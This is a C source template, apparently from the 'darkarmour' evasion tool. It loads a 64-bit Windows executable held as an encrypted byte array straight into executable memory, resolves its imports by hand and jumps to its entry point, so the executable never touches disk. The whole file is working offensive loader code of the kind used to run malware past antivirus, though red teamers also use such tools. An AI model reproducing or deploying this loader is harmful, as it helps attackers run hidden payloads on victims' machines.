/*

        #############################################################################
        ##                              IMPORTANT                                  ##
        ##                                                                         ##
        ##        Elements of this file are automatically generated                ##
        ##        by editing this file you can cause this element of               ##
        ##        darkarmour to break... dont do that.                             ##
        ##                                                                         ##
        #############################################################################

*/


#include <windows.h>
#include <stdio.h>

#include "../../build/main.h"
#include "../../build/pe_image.h"

VOID FixImageIAT( PIMAGE_DOS_HEADER dos_header, PIMAGE_NT_HEADERS nt_header)
{
    PIMAGE_THUNK_DATA thunk;
    PIMAGE_THUNK_DATA fixup;
    DWORD iat_rva;
    SIZE_T iat_size;
    HMODULE import_base;
    PIMAGE_IMPORT_DESCRIPTOR import_table = (PIMAGE_IMPORT_DESCRIPTOR)(nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress + (UINT_PTR)dos_header);

    DWORD iat_loc = (nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT].VirtualAddress) ? IMAGE_DIRECTORY_ENTRY_IAT : IMAGE_DIRECTORY_ENTRY_IMPORT;

    iat_rva = nt_header->OptionalHeader.DataDirectory[iat_loc].VirtualAddress;
    iat_size = nt_header->OptionalHeader.DataDirectory[iat_loc].Size;

    LPVOID iat = (LPVOID)(iat_rva + (UINT_PTR)dos_header);
    DWORD op;
    VirtualProtect(iat, iat_size, PAGE_READWRITE, &op);
    while (import_table->Name) {
        import_base = LoadLibraryA((LPCSTR)(import_table->Name + (UINT_PTR)dos_header));
        fixup = (PIMAGE_THUNK_DATA)(import_table->FirstThunk + (UINT_PTR)dos_header);
        if (import_table->OriginalFirstThunk) {
            thunk = (PIMAGE_THUNK_DATA)(import_table->OriginalFirstThunk + (UINT_PTR)dos_header);
        } else {
            thunk = (PIMAGE_THUNK_DATA)(import_table->FirstThunk + (UINT_PTR)dos_header);
        }

        while (thunk->u1.Function) {
            PCHAR func_name;
            if (thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64) {
                fixup->u1.Function =
                    (UINT_PTR)GetProcAddress(import_base, (LPCSTR)(thunk->u1.Ordinal & 0xFFFF));

            } else {
                func_name = (PCHAR)(((PIMAGE_IMPORT_BY_NAME)(thunk->u1.AddressOfData))->Name + (UINT_PTR)dos_header);
                fixup->u1.Function = (UINT_PTR)GetProcAddress(import_base, func_name);
            }
            fixup++;
            thunk++;
        }
        import_table++;
    }
    return;
}

//if base_addr points to a byte stream in memory then load module from that
//if base_addr is NULL then attempt to map module into memory from resource
//***note if module is memory mapped manually then it has no loaded module handle
//and some modules use the module base as the handle for a call and it will fail
LPVOID MapImageToMemory(LPVOID base_addr) {
  LPVOID mem_image_base = NULL;

  PIMAGE_DOS_HEADER raw_image_base = (PIMAGE_DOS_HEADER)base_addr;

  //only accept from in mem array

  if (IMAGE_DOS_SIGNATURE != raw_image_base->e_magic)
      return NULL;

  PIMAGE_NT_HEADERS nt_header = (PIMAGE_NT_HEADERS)(raw_image_base->e_lfanew + (UINT_PTR)raw_image_base);
  if (IMAGE_NT_SIGNATURE != nt_header->Signature)
      return NULL;

  //only 64bit modules will be loaded
  if (IMAGE_FILE_MACHINE_AMD64 != nt_header->FileHeader.Machine)
      return NULL;

  //Not going to bother with .net
  if (nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR].VirtualAddress)
      return NULL;

  PIMAGE_SECTION_HEADER section_header =
      (PIMAGE_SECTION_HEADER)(raw_image_base->e_lfanew + sizeof(*nt_header) + (UINT_PTR)raw_image_base);

  mem_image_base = VirtualAlloc(
      (LPVOID)(nt_header->OptionalHeader.ImageBase),
      nt_header->OptionalHeader.SizeOfImage ,
      MEM_COMMIT | MEM_RESERVE,
      PAGE_EXECUTE_READWRITE);

  if (NULL == mem_image_base) {
      mem_image_base = VirtualAlloc(
          NULL,
          nt_header->OptionalHeader.SizeOfImage,
          MEM_COMMIT | MEM_RESERVE,
          PAGE_EXECUTE_READWRITE);
  }

  if (NULL == mem_image_base)
      return NULL;

  memcpy(mem_image_base, (LPVOID)raw_image_base, nt_header->OptionalHeader.SizeOfHeaders);

  for (int i = 0; i < nt_header->FileHeader.NumberOfSections; i++) {
      memcpy(
          (LPVOID)(section_header->VirtualAddress + (UINT_PTR)mem_image_base),
          (LPVOID)(section_header->PointerToRawData + (UINT_PTR)raw_image_base),
          section_header->SizeOfRawData);
      section_header++;
  }
  return mem_image_base;
}

int main() {
  int i;
  unsigned char decrypted_bytes[array_len+1] = {};



  PIMAGE_DOS_HEADER image_base = (PIMAGE_DOS_HEADER)MapImageToMemory((LPVOID)decrypted_bytes);
  if (!image_base) {
      printf("%s\n", "no base addr");
  }

  PIMAGE_NT_HEADERS nt_header = (PIMAGE_NT_HEADERS)(image_base->e_lfanew + (UINT_PTR)image_base);
  HANDLE actctx = NULL;
  UINT_PTR cookie = 0;
  BOOL changed_ctx = FALSE;

  FixImageIAT(image_base, nt_header);

  LPVOID oep = (LPVOID)(nt_header->OptionalHeader.AddressOfEntryPoint + (UINT_PTR)image_base);

  printf("[+] jumping to %p (%x)\n", &oep, &oep);

  Sleep(5);

  ((void(*)())(oep))();
  //__asm (
  //  "jmp %rip"
  //);

  if (changed_ctx) {
      DeactivateActCtx(0, cookie);
      ReleaseActCtx(actctx);
  }
  return 0;
}
